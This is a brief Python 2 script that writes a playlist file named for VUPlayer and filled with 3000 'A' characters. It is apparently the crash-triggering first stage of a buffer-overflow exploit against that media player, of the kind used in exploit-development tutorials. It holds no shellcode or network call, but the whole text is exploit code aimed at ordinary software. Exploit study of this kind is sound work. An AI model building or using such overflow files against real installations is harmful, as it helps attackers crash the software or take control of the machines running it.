buf = "A"*3000

print "[+] Creating .m3u file of size "+ str(len(buf))

file = open('vuplayer-dep.m3u','w');
file.write(buf);
file.close();

print "[+] Done creating the file"